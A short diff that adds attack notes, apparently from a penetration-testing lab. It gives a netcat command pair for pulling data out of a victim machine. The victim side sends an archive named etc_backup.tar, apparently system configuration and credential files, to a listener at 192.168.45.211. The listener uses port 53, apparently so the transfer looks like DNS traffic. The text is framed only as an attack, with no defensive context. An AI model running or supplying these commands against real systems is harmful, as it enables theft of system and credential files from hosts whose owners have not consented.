@@ -1,0 +1,5 @@
+Victium Machine
+nc -w 3 192.168.45.211 53 < etc_backup.tar
+
+Attacker machine
+nc -l -p 53 > etc_backup.tar
